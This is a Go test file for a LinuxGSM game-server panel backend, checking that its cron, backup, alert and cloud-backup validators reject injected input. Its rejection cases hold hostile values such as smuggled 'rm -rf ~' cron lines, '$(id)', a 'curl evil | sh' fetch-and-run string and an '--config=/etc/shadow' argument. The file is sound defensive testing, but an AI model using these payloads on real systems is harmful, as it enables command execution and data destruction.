package backend

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestIsValidCronExpr(t *testing.T) {
	ok := []string{"0 4 * * *", "*/15 * * * *", "0 0 * * 0", "30 2 1-15 * 1,3,5", "@daily"}
	bad := []string{"", "* * * *", "0 4 * * * extra", "0 4 * * *\n* * * * * rm -rf ~", "0 4 * * $(id)", "@reboot", "a b c d e", "0 4 * * * ; id"}
	for _, e := range ok {
		if !IsValidCronExpr(e) {
			t.Errorf("valid cron rejected: %q", e)
		}
	}
	for _, e := range bad {
		if IsValidCronExpr(e) {
			t.Errorf("invalid cron accepted: %q", e)
		}
	}
}

func TestValidateCronSchedule(t *testing.T) {
	if err := ValidateCronSchedule(CronSchedule{MonitorInterval: "5", UpdateInterval: "30", RestartTime: "04:30", CoreUpdateDay: "0"}); err != nil {
		t.Fatal(err)
	}
	bad := []CronSchedule{
		{MonitorInterval: "5 * * * * /bin/sh -c id #"},
		{MonitorInterval: "0"},
		{UpdateInterval: "61"},
		{RestartTime: "25:00"},
		{RestartTime: "4:30\n* * * * * id"},
		{CoreUpdateDay: "8"},
		{CoreUpdateDay: "1;id"},
	}
	for _, s := range bad {
		if ValidateCronSchedule(s) == nil {
			t.Errorf("malicious schedule accepted: %+v", s)
		}
	}
}

func TestCronLineCommandExactScriptMatch(t *testing.T) {
	expr, cmd, ok := cronLineCommand("*/5 * * * * /home/vh/vhserver monitor > /dev/null 2>&1", "/home/vh/vhserver")
	if !ok || cmd != "monitor" || expr != "*/5 * * * *" {
		t.Fatalf("unexpected parse: %q %q %v", expr, cmd, ok)
	}
	if _, _, ok := cronLineCommand("*/5 * * * * /home/vh/vhserver-2 monitor", "/home/vh/vhserver"); ok {
		t.Fatal("other instance matched")
	}
	if _, _, ok := cronLineCommand("# */5 * * * * /home/vh/vhserver monitor", "/home/vh/vhserver"); ok {
		t.Fatal("comment matched")
	}
	expr, cmd, ok = cronLineCommand("30 4 * * * cd /home/vh && ./vhserver force-update > /dev/null", "/home/vh/vhserver")
	if !ok || cmd != "force-update" || expr != "30 4 * * *" {
		t.Fatalf("cd line: %q %q %v", expr, cmd, ok)
	}
	if _, _, ok := cronLineCommand("30 4 * * * cd /home/other && ./vhserver update", "/home/vh/vhserver"); ok {
		t.Fatal("script in another directory matched")
	}
	if expr, cmd, ok := cronLineCommand("@daily /home/vh/vhserver backup", "/home/vh/vhserver"); !ok || expr != "@daily" || cmd != "backup" {
		t.Fatalf("macro line: %q %q %v", expr, cmd, ok)
	}
}

func TestRewriteCrontabComments(t *testing.T) {
	srv := GameServerInstance{Script: "vhserver", Dir: "/home/vh"}
	rt := &fakeRuntime{crontab: strings.Join([]string{
		"# LinuxGSM Old Name Geplante Wartungsaufgaben",
		"*/5 * * * * /home/vh/vhserver monitor > /dev/null 2>&1",
		"# LinuxGSM Other Server Geplante Wartungsaufgaben",
		"*/5 * * * * /home/vh/vhserver-2 monitor > /dev/null 2>&1",
		"0 3 * * * cd /home/vh && ./vhserver update",
		"0 5 * * * /home/vh/vhserver backup",
	}, "\n")}
	if err := rewriteCrontab(rt, srv, maintenanceCommands, []string{maintenanceComment(srv), "*/10 * * * * /home/vh/vhserver monitor"}); err != nil {
		t.Fatal(err)
	}
	want := strings.Join([]string{
		"# LinuxGSM Other Server Geplante Wartungsaufgaben",
		"*/5 * * * * /home/vh/vhserver-2 monitor > /dev/null 2>&1",
		"0 5 * * * /home/vh/vhserver backup",
		"# LinuxGSM vhserver: scheduled maintenance",
		"*/10 * * * * /home/vh/vhserver monitor",
	}, "\n")
	if rt.crontab != want {
		t.Fatalf("crontab:\n%s\nwant:\n%s", rt.crontab, want)
	}
}

func TestValidateBackupSettings(t *testing.T) {
	if err := ValidateBackupSettings(BackupSettings{MaxBackups: "4", MaxBackupDays: "30", StopOnBackup: "on", AutoBackupEnabled: true, AutoBackupCron: "0 5 * * *"}); err != nil {
		t.Fatal(err)
	}
	for _, s := range []BackupSettings{
		{MaxBackups: `4"; rm -rf ~; "`},
		{StopOnBackup: "maybe"},
		{AutoBackupEnabled: true, AutoBackupCron: "0 5 * * *\n* * * * * id"},
	} {
		if ValidateBackupSettings(s) == nil {
			t.Errorf("unsafe backup settings accepted: %+v", s)
		}
	}
}

func TestUpdateCfgLines(t *testing.T) {
	in := "# comment\nmaxbackups=\"2\"\nother=\"x\"\nmaxbackupdays=\"30\"\nmaxbackups=\"3\"\n"
	values := map[string]string{"maxbackups": "5", "stoponbackup": "on", "maxbackupdays": ""}
	order := []string{"maxbackups", "maxbackupdays", "stoponbackup"}
	want := "# comment\nmaxbackups=\"5\"\nother=\"x\"\nstoponbackup=\"on\"\n"
	if out := updateCfgLines(in, values, order, false, true); out != want {
		t.Fatalf("got %q, want %q", out, want)
	}
	// Without appending, only existing keys change (used for the secrets file).
	if out := updateCfgLines("other=\"x\"", values, order, false, false); out != "other=\"x\"" {
		t.Fatalf("keys added without appendMissing: %q", out)
	}
}

func TestCfgValue(t *testing.T) {
	cases := map[string]string{
		`"a b"`:             "a b",
		`"a \"q\" b" # c`:   `a "q" b`,
		`'x y'`:             "x y",
		`27015 # game`:      "27015",
		`${lgsmdir}/backup`: "${lgsmdir}/backup",
		``:                  "",
	}
	for in, want := range cases {
		if got := cfgValue(in); got != want {
			t.Errorf("cfgValue(%q) = %q, want %q", in, got, want)
		}
	}
	vals := cfgValues("#port=\"1\"\nport=\"27015\"\nclientport=\"27005\"\nport=\"27016\"\n")
	if vals["port"] != "27016" || vals["clientport"] != "27005" {
		t.Errorf("cfgValues = %v", vals)
	}
}

func TestAlertSettingsMaskingAndValidation(t *testing.T) {
	stored := AlertSettings{DiscordWebhook: "https://discord.example/secret", EmailPass: "smtp-pass", EmailDest: "a@b.c"}
	masked := stored.Masked()
	if masked.DiscordWebhook != SecretMask || masked.EmailPass != SecretMask {
		t.Fatal("secrets not masked")
	}
	if masked.EmailDest != "a@b.c" {
		t.Fatal("non-secret value masked")
	}
	if stored.DiscordWebhook != "https://discord.example/secret" {
		t.Fatal("Masked must not modify the original")
	}

	submitted := masked
	submitted.mergeSecrets(stored)
	if submitted.DiscordWebhook != stored.DiscordWebhook || submitted.EmailPass != stored.EmailPass {
		t.Fatal("masked values must keep stored secrets")
	}

	evil := AlertSettings{DiscordWebhook: `x"; curl evil | sh; "`}
	if evil.Validate() == nil {
		t.Fatal("config injection accepted")
	}
}

func TestAlertSettingsRoundTrip(t *testing.T) {
	dir := t.TempDir()
	srv := GameServerInstance{ID: "vhserver", User: "vhserver", Script: "vhserver", Dir: dir}
	im := NewStaticInstanceManager(t.TempDir(), srv)
	cfg := filepath.Join(dir, "lgsm", "config-lgsm", "vhserver", "vhserver.cfg")
	mustWrite(t, cfg, "discordalert=\"on\"\ndiscordwebhook=\"https://hook/secret\"\n")

	got, err := im.GetAlertSettings("vhserver")
	if err != nil {
		t.Fatal(err)
	}
	if !got.DiscordEnabled || got.DiscordWebhook != SecretMask {
		t.Fatalf("unexpected settings: %+v", got)
	}
	got.EmailDest = "admin@example.com"
	if err := im.SaveAlertSettings("vhserver", got); err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(cfg)
	if !strings.Contains(string(data), `discordwebhook="https://hook/secret"`) || !strings.Contains(string(data), `emaildest="admin@example.com"`) {
		t.Fatalf("unexpected config:\n%s", data)
	}
	got.EmailDest = "x\"\nrm -rf ~"
	if err := im.SaveAlertSettings("vhserver", got); err == nil {
		t.Fatal("injection was written")
	}
}

func TestStopModeValidation(t *testing.T) {
	for _, m := range []string{"", "default", "1", "13", "16"} {
		if !IsValidStopMode(m) {
			t.Errorf("valid stop mode rejected: %q", m)
		}
	}
	for _, m := range []string{"0", "17", `1"; id; "`, "abc"} {
		if IsValidStopMode(m) {
			t.Errorf("invalid stop mode accepted: %q", m)
		}
	}
}

func TestCloudBackupValidation(t *testing.T) {
	if err := ValidateCloudBackupSettings(CloudBackupSettings{Enabled: true, Remote: "gdrive", Path: "backups/ark"}); err != nil {
		t.Fatal(err)
	}
	for _, s := range []CloudBackupSettings{
		{Remote: "x; id", Path: "a"},
		{Remote: "gdrive", Path: "--config=/etc/shadow"},
		{Remote: "gdrive", Path: "a b'c"},
		{Remote: "gdrive", Path: "../.."},
		{Enabled: true, Remote: "", Path: "x"},
	} {
		if ValidateCloudBackupSettings(s) == nil {
			t.Errorf("unsafe cloud settings accepted: %+v", s)
		}
	}
}
